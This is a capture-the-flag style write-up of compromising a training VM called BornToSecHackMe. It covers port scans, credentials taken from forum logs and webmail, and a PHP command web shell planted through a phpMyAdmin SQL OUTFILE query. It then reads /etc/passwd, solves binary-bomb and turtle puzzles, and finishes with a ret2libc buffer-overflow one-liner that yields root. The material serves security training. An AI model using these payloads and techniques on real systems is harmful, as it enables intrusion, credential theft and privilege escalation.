## I - Find the machine's IP
``nmap -sn 192.168.31.0/24``
>Nmap scan report for BornToSecHackMe (**192.168.31.26**)

----

## II - We check the services open on all ports
``nmap -p- -sV 192.168.31.26``
>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:55 CEST  
>Nmap scan report for BornToSecHackMe (192.168.31.26)  
>Host is up (0.000079s latency).  
>Not shown: 65529 closed tcp ports (conn-refused)   
>PORT		STATE	SERVICE    VERSION  
>**21/tcp	open	ftp        vsftpd 2.0.8 or later  
>22/tcp		open	ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)  
>80/tcp		open	http       Apache httpd 2.2.22 ((Ubuntu))  
>143/tcp		open	imap       Dovecot imapd  
>443/tcp		open	ssl/http   Apache httpd 2.2.22  
>993/tcp		open	ssl/imaps?  
>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel**  

----

## III - We study known flaws in services
**SSH :**
CVE-2016-0777 : Allows a malicious server to exfiltrate private client data by sending an SSH2_MSG_UNIMPLEMENTED packet in response to an SSH_FXP_INIT request.

**Apache httpd 2.2.22 :**
CVE-2017-7679: A vulnerability in the mod_mime module can allow an attacker to execute arbitrary code remotely.
[-] https://192.168.31.26:443
-> The target is not vulnerable to CVE-2021-42013 (requires mod_cgi to be enabled).

**VSFTPD :**
backdoor in v2.3.4
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.1.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.31.26:21 - Banner: 220 Welcome on this server
[*] 192.168.31.26:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

----

## III - We study the tree structure of the site

With ``dirb``, on https, we find this interesting:

### 1. /forum
- type : my little forum
- We search the forum and find a post:
>Probleme login ?

Inside we study the logs and we realize that the user must have tried to put his password instead of the login here:
>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user **!q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2

We have already identified their login information from several lines including the one below:

>Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user **lmezard**

- We tried on the forum, lmezard / !q]Ej?5K5cyAJ -> It works.
- We found their email address on their profile: **laurie@borntosec.net**

### 2. /webmail
- SquirrelMail v1.4.22
- Using the information gathered from the forum, we logged in: laurie@borntosec.net / !q\]Ej?*5K5cy*AJ
- We found an email :
``You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$``

**On va pouvoir probablement se connecter a phpmyadmin**

- Known vulnerability : SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
``bash /usr/share/exploitdb/exploits/linux/remote/41910.sh https://192.168.31.26/webmail``
-> Does not seem to work

### 3. /phpmyadmin
- The combination **root / Fg-'kKXBj87E:aJ$** works
- In forum_db, mlf2_settings we find the version of my little forum: 2.3.4
- In forum_db / mlt2_userdata, we have access to everyone's encrypted passwords -> TO BE EXPLORED? TRY DECRYPTING BY FINDING INFORMATION ON THE ENCRYPTION METHOD USED BY THIS VERSION OF MY LITTLE FORUM
- In MySQL there is a user table, with root / debian-sys-maint and the passwords in sha1:
>root / 8A074E30DC25CE94B17C9858F794303F71E3BCC7
-> This probably corresponds to Fg-'kKXBj87E:aJ$

>debian-sys-maint / 52B24D4192EDDFB439C67E1F92421C4D2D4F5598
- We attempted to decrypt the passwords, without success.
We will create a simple reverse shell by injecting:
````
SELECT "<HTML><BODY><FORM METHOD='GET' NAME='myform' ACTION=''><INPUT TYPE='text' NAME='cmd'><INPUT TYPE='submit' VALUE='Send'></FORM><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
````
- We can now access it here:  https://192.168.31.26/forum/templates_c/cmd.php

----

## IV - Let's exploit the reverse shell

### List the users
``cat /etc/passwd`` (see full result in the file /resources/users)
Here are the results that seem interesting: :
>root: x:0:0:root:/root:/bin/bash
www-data: x:33:33:www-data:/var/www:/bin/sh
ft_root: x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard: x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net: x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie: x:1003:1003:,,,:/home/laurie:/bin/bash
thor: x:1004:1004:,,,:/home/thor:/bin/bash
zaz: x:1005:1005:,,,:/home/zaz:/bin/bash

We are interested in those who have a home directory with the command ``ls -la /home``

>drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz

Hmm... LOOKATME? It is located at www-data, luckily, it is our current user, so let's take a look:
``ls -la /home/LOOKATME``
>-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password

``cat /home/LOOKATME/password``
>lmezard:G!@M6f4Eatau{sF"

We test it in SSH, it doesn't work.
Since we already know their forum and webmail password, all that's left is to try in ftp -> **it works!**

----

## V - Le FTP
Let's download the README file and read it:
>Complete this little challenge and use the result as password for user 'laurie' to login in ssh

**Let's download the fun file**
We decompress the archive tar xvf fun
We find ourselves with a folder containing 750 pcap files
These are not actually pcap files:
``cat 00M73.pcap ``
>void useless() {
>
>//file12%

The files seem numbered in the comments.
We will try to merge them in the order indicated by the comments, we will use the shell script fusion-pcap.sh.
We clean the unnecessary data from the file, compile and execute the code, which gives:
>MY PASSWORD IS: Iheartpwnage
>Now SHA-256 it and submit

Once encrypted in sha256 we get:
>330B845F32185747E4F8CA15D40CA59796035C89EA809FB5D30F4DA83ECF45A4

----

## VI - Laurie SSH
We test to connect in SSH, it does not work, we test in lowercase:
>330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

It works, we are now logged in as Laurie, in ssh on the server!

We take a look at the contents of the folder
``ls -l``
>-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
>-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README

We read the README
``cat README ``
>Diffuse this bomb!
>When you have all the password use it as "thor" user with ssh.
>
>HINT:
>P
> 2
> b
>
>o
>4
>
>NO SPACE IN THE PASSWORD (password is case sensitive).

A new challenge...
We will analyze the bomb, we start by downloading it:
``scp laurie@192.168.21.205:/home/laurie/bomb ~/Desktop/``

Then we study it by decompiling everything with Ghidra:
- The first level is simple, we see that phase1 just compares the user input with the string Public speaking is very easy.
>Phase 1 defused. How about the next one?

- By studying phase2, we understand that the first number must be 1 and that for the following each number must be equal to the previous one multiplied by the current number's position (index + 1), we obtain:
``1 2 6 24 120 720``
>That's number 2.  Keep going!

- For phase3, we need 3 arguments. The first one is a number between 0 and 7, no matter what. The second argument is linked to the first one choice, and the last argument must be the decimal correspondence defined for each letter, so here are the possible combinations:
``0 q 777, 1 b 214, 2 b 755, 3 k 251, 4 o 160, 5 t 458, 6 v 780, 7 b 524``
The hint being ``b`` we will therefore choose ``1 b 214``.
>Halfway there!

- For phase4 we understand that:
	- it must be a number greater than 0
	- when we pass it the func4 function it must give 55
	- By analyzing func4 we understand that it is a recursive fibonacci sequence that starts with two number 1. In a normal sequence (starting with 0 then 1) the number 55 is obtained at the tenth position. Since we start directly at the second position (1 then 1), the expected number is therefore **9**.
9
>So you got that one.  Try this one.

- For phase 5, we need to first find the value of array.123, by searching with Ghidra we find isrveawhobpnutfg.
Then, each character of the input string is converted to a byte, and a bitwise AND operator with 0xf (or 15 in decimal) is applied, which has the effect of retaining only the last 4 bits of the byte (i.e., the remainder of the byte division by 16).
The previous operation gives an index in array.123 (between 0 and 15).
After doing this for all the letters, we have a series of indices. These must be used to retrieve the letters in array.123 and form a string that matches the one hardcoded in the bomb (giants).
"g" is at index 15 in array.123, char with last 4 bits is 15 -> "o" (0x6F).
"i" is at index 0 in array.123, char with last 4 bits is 0 -> "p" (0x70).
"a" is at index 6 in array.123, char with last 4 bits is 6 -> "e" (0x75).
"n" is at index 11 in array.123, char with last 4 bits is 11 -> "k" (0x6B).
"t" is at index 13 in array.123, char with last 4 bits is 13 -> "m" (0x6D).
"s" is at index 1 in array.123, char with last 4 bits is 1 -> "q" (0x71).
``opekmq``
>Good work!  On to the next...

- For phase6, we understand that the input must be 6 different numbers between 1 and 6. The different permutations must be tested to find the one that matches the expected values.
It seems that the expected array is [3, 4, 5, 6, 1, 2] (or reverse since we will enter it in reverse order). By trying several permutations, we find that 2 1 6 5 4 3 works.
>Correct combinaison found: 4 2 6 3 1 5

Try connecting with SSH using thor / Publicspeakingisveryeasy.126241207201b2149opekmq426315
-> It doesn't work!

Going back through the subject project file (and also after a lot of research notably on Slack), we notice the instruction:
>For the part related to a (bin) bomb: If the password found is
>123456. The password to use is 123546.

So we swap the 3 and the 1 which gives:
``Publicspeakingisveryeasy.126241207201b2149opekmq426135``
**And it works!**

## VII - Thor SSH
``cat README``
Finish this challenge and use the result as the password for the 'zaz' user.

``cat turtle ``
>[...]
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 1 spaces
>Tourne droite de 1 degrees
>Avance 50 spaces
>
>Avance 100 spaces
>Recule 200 spaces
>Avance 100 spaces
>Tourne droite de 90 degrees
>Avance 100 spaces
>Tourne droite de 90 degrees
>Avance 100 spaces
>Recule 200 spaces
>
>Can you digest the message? :)

We will download the file:
``scp thor@192.168.21.205:/home/thor/turtle ~/Desktop/``

"Turtle" refers to a graphics module in the Python programming language. It's inspired by Logo programming and allows moving a turtle on the screen. We will create a script (scripts/turtle.py) and execute it.
We see the turtle draw the letters **SLASH**.
After several tests (uppercase, lowercase, SHA1, SHA256), we finally find the expected format, it is a simple MD5 hash:
``646da671ca01bb5d84dbb5fb2238dc8e``

## VII - Zaz SSH

By analyzing the executable with Ghidra, we realize that the main function uses strcpy, with a destination of 140, without checking the source size.
So we will perform a buffer overflow and have the program execute a root shell.

``gdb exploit_me``
>(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.

- We set a breakpoint at the end of the main
``(gdb) break *0x08048437``
>Breakpoint 1 at 0x8048437

- We send 140 characters to the program to fill the buffer
``(gdb) run $(python -c 'print "a"*140')``
>Starting program: /home/zaz/exploit_me $(python -c 'print "a"*140')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Breakpoint 1, 0x08048437 in main ()

- We get the address of the system command
``(gdb) p system``
>$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

- We get the address of the /bin/sh argument
``(gdb) find __libc_start_main,+99999999,"/bin/sh"``
>0xb7f8cc58
1 pattern found.

- We perform the buffer overflow, filling the first 140 characters with garbage, then the address of the system, then garbage (to fill the system argument), then we provide the argument.
./exploit_me `python -c "print('a' * 140 + '\x60\xb0\xe6\xb7' + '0000' + '\x58\xcc\xf8\xb7')"`

#-> **ROOOOOOT**
